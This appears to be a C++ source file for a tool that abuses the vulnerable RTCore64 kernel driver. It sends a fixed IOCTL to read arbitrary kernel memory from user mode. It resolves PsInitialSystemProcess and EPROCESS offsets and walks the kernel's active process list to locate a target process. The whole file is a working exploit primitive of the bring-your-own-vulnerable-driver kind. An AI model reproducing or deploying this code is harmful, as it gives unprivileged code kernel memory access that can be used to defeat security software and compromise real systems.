#include "../Header.h"

namespace Vicra {
const DWORD64 Driver::FindProcess( const DWORD& UniqueProcessIdToFind ) {
	auto InitialProcess = Read64(
		( DWORD64 ) m_pPsInitialSystemProcess 
	);
	if ( !InitialProcess )
		return NULL;

	auto Head =
		Read64( InitialProcess + m_ActiveProcessLinksOffset );
	auto Current =
		Read64( Head );

	do {
		auto EProcess = Current - m_ActiveProcessLinksOffset;
		auto UniqueProcessId = Read32( EProcess + m_UniqueProcessIdOffset );

		if ( UniqueProcessId == UniqueProcessIdToFind )
			return EProcess;

		Current = Read64( Current );
	} while ( Current && Current != Head );

	return NULL;
}

const DWORD Driver::Read32( const DWORD64& Address ) {
	struct MEMORY_READ_REQ {
		BYTE    Pad0[ 8 ];
		UINT64  Address;
		BYTE    Pad1[ 8 ];
		DWORD   Size;
		DWORD   Value;
		BYTE    Pad3[ 16 ];
	};

	MEMORY_READ_REQ Request {};
	Request.Address = Address;
	Request.Size = 4;

	auto Result = NT_SUCCESS( NtDeviceIoControlFile(
		m_Device,
		NULL, NULL, NULL,
		&m_StatusBlock,
		0x80002048,
		&Request,
		sizeof( MEMORY_READ_REQ ),
		&Request,
		sizeof( MEMORY_READ_REQ )
	) );

	return Result ? Request.Value : 0;
}
const DWORD64 Driver::Read64( const DWORD64& Address ) {
	DWORD Low = Read32( Address );
	DWORD High = Read32( Address + sizeof( DWORD ) );

	return ( ( DWORD64 ) High << 32 ) | Low;
}

const BOOL Driver::Setup( ) {
	UNICODE_STRING UnicodeName {};
	RtlInitUnicodeString( &UnicodeName, L"\\??\\RTCore64" );

	OBJECT_ATTRIBUTES Attributes {};
	InitializeObjectAttributes( &Attributes, &UnicodeName, OBJ_CASE_INSENSITIVE, nullptr, nullptr );

	if ( !NT_SUCCESS( NtCreateFile(
		&m_Device,
		GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
		&Attributes,
		&m_StatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL, NULL
	) ) )
		return FALSE;

	UNICODE_STRING KrnlName {};

	ANSI_STRING PsInitialSystemProcessName {};
	ANSI_STRING PsGetProcessIdName {};

	RtlInitUnicodeString( &KrnlName, L"ntoskrnl.exe" );

	RtlInitAnsiString( &PsInitialSystemProcessName, "PsInitialSystemProcess" );
	RtlInitAnsiString( &PsGetProcessIdName, "PsGetProcessId" );

	ULONG Characteristics = DONT_RESOLVE_DLL_REFERENCES;
	if ( !NT_SUCCESS( LdrLoadDll(
		NULL, &Characteristics, &KrnlName, ( PPVOID )&NtosKrnl
	) ) ) return FALSE;

	DWORD Needed;
	if ( !K32EnumDeviceDrivers( 
		( PPVOID )KernelBase, sizeof( KernelBase ), &Needed
	) ) return FALSE;

	if ( !NT_SUCCESS( LdrGetProcedureAddress(
		NtosKrnl, &PsInitialSystemProcessName,
		NULL, ( PPVOID )&m_pPsInitialSystemProcess
	) ) ) return FALSE;

	PBYTE pPsGetProcessId;
	if ( !NT_SUCCESS( LdrGetProcedureAddress(
		NtosKrnl, &PsGetProcessIdName,
		NULL, ( PPVOID )&pPsGetProcessId
	) ) ) return FALSE;

	m_pPsInitialSystemProcess = ( PBYTE )( m_pPsInitialSystemProcess - ( DWORD64 )NtosKrnl );
	m_pPsInitialSystemProcess = ( PBYTE )( m_pPsInitialSystemProcess + ( DWORD64 )KernelBase[ 0 ] );

	/*
		mov     rax, [rcx+1D0h]
		retn
	*/
	m_UniqueProcessIdOffset = reinterpret_cast< PSHORT >( pPsGetProcessId + 0x3 )[ 0 ];

	/*
		VOID* UniqueProcessId;                                                  //0x1d0
		struct _LIST_ENTRY ActiveProcessLinks;                                  //0x1d8
	*/
	m_ActiveProcessLinksOffset = m_UniqueProcessIdOffset + sizeof( PVOID );

	this->IsConnected = TRUE;

	return TRUE;
}
const BOOL Driver::Close( ) {
	return NT_SUCCESS( LdrUnloadDll( NtosKrnl ) ) && NT_SUCCESS( NtClose( m_Device ) );
}
}